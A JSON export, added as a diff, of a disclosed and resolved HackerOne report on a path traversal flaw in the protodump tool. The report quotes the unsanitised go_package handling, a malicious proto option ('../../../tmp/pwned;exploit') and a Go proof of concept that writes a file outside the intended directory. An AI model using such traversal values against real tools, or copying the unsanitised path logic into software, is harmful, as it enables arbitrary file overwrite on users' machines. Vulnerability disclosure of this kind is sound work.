@@ -1,0 +1,136 @@
+{
+  "id": 3384150,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzg0MTUw",
+  "url": "https://hackerone.com/reports/3384150",
+  "title": "Arbitrary File Write",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2025-10-14T22:20:39.425Z",
+  "submitted_at": "2025-10-14T22:20:40.992Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "newby99",
+    "url": "/newby99",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/26vexmfanvjm9dvw2oscwbc7pnip/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 29833,
+    "url": "https://hackerone.com/arkadiyt-projects",
+    "handle": "arkadiyt-projects",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/029/833/c7d79126a63550aa7c99662ecb49eca1a8b2d1c3_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/029/833/c7d79126a63550aa7c99662ecb49eca1a8b2d1c3_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "arkadiyt-projects",
+      "twitter_handle": "arkadiyt",
+      "website": "https://arkadiyt.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2025-10-19T21:19:02.114Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-10-19T21:17:50.294Z",
+  "team_member_agreed_on_going_public_at": "2025-10-19T21:19:01.893Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi, \n\nProtodump contains a path traversal vulnerability that allows to write files to arbitrary locations on the filesystem outside the intended output directory. This occurs due to insufficient validation of the go_package option extracted from protobuf descriptors embedded in analyzed binaries.\n\nThe Filename() function extracts the go_package option from protobuf descriptors without sanitization:\n\n(pkg/protodump/protodump.go)\n```\nfunc (pd *ProtoDefinition) Filename() string {\n    goPackage := pd.pb.GetOptions().GetGoPackage()\n    index := strings.Index(goPackage, \";\")\n    if index == -1 {\n        return pd.descriptor.Path()\n    }\n    // BUG: No sanitization of goPackage path\n    return path.Join(goPackage[:index], path.Base(pd.descriptor.Path()))\n}\n```\nThe goPackage value comes directly from the protobuf descriptor being analyzed and can contain path traversal sequences like ../../../\n\nThe main function uses this unsanitized filename to construct the output path:\n```\nfilename := definition.Filename()\nif strings.HasSuffix(filename, \".proto\") {\n    dir := path.Join(*output, path.Dir(filename))\n    final := path.Join(dir, path.Base(filename))\n    os.MkdirAll(dir, 0700)\n    os.WriteFile(final, []byte(definition.String()), 0700)\n    fmt.Printf(\"Wrote %s\\n\", final)\n}\n```\n\n\nThe attack vector is the following:\nan attacker creates a binary containing a protobuf descriptor with a malicious go_package option:\n```\nsyntax = \"proto3\";\npackage exploit;\n\n// Malicious path traversal\noption go_package = \"../../../tmp/pwned;exploit\";\n\nmessage MaliciousMessage {\n  string data = 1;\n}\n```\n\nWhen the user runs protodump on this binary, the tool writes the extracted proto file outside the intended output directory (overriding any existing files with the same name in the target location)...\nHere is a poc emulating the code:\n```\npackage main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"path\"\n    \"path/filepath\"\n    \"strings\"\n)\n\nfunc main() {\n    // Get absolute path for output directory\n    output, _ := filepath.Abs(\"./safe_output\")\n\n    // Attacker-controlled values from malicious proto\n    maliciousGoPackage := \"../../../tmp/pwned;exploit\"\n    protoName := \"evil.proto\"\n\n    fmt.Println(\"=== Protodump Path Traversal Vulnerability PoC ===\")\n    fmt.Println()\n\n    // VULNERABLE CODE: Replicate protodump's logic\n    index := strings.Index(maliciousGoPackage, \";\")\n    var filename string\n    if index == -1 {\n        filename = protoName\n    } else {\n        filename = path.Join(maliciousGoPackage[:index], protoName)\n    }\n\n    dir := path.Join(output, path.Dir(filename))\n    final := path.Join(dir, path.Base(filename))\n    finalAbs, _ := filepath.Abs(final)\n\n    fmt.Println(\"Configuration:\")\n    fmt.Printf(\"  Intended output: %s\\n\", output)\n    fmt.Printf(\"  Malicious input: %s\\n\", maliciousGoPackage)\n    fmt.Println()\n\n    fmt.Println(\"Path Computation:\")\n    fmt.Printf(\"  filename: %s\\n\", filename)\n    fmt.Printf(\"  final:    %s\\n\", finalAbs)\n    fmt.Println()\n\n    // Create the file\n    os.MkdirAll(dir, 0755)\n    content := \"syntax = \\\"proto3\\\";\\n\\npackage exploit;\\n\\nmessage Pwned { string data = 1; }\\n\"\n    os.WriteFile(final, []byte(content), 0644)\n\n    fmt.Println(\"Result:\")\n    fmt.Printf(\"  Expected: %s/evil.proto\\n\", output)\n    fmt.Printf(\"  Actual:   %s\\n\", finalAbs)\n    fmt.Println()\n\n    if !strings.HasPrefix(finalAbs, output) {\n        fmt.Println(\"VULNERABILITY CONFIRMED: File written outside intended directory\")\n    }\n}\n```\n\n## Impact\n\narbitrary file write on user's machine\n\n**Affected Version**: Latest (commit 17ad807, verified October 2025)\n**Repository**: https://github.com/arkadiyt/protodump\n**Installation**: go install github.com/arkadiyt/protodump/cmd/protodump@latest",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2025-11-18T21:17:50.463Z",
+  "allow_singular_disclosure_after": -14838168.409052039,
+  "singular_disclosure_allowed": true,
+  "vote_count": 55,
+  "voters": [
+    "orange303",
+    "k0ns0l",
+    "zy9ard3",
+    "0xoroot",
+    "mohaned0101",
+    "thalaivar304",
+    "2026",
+    "arabinda7",
+    "wefega",
+    "sh3rif0x",
+    "and 45 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "high",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 390761,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/arkadiyt/protodump",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
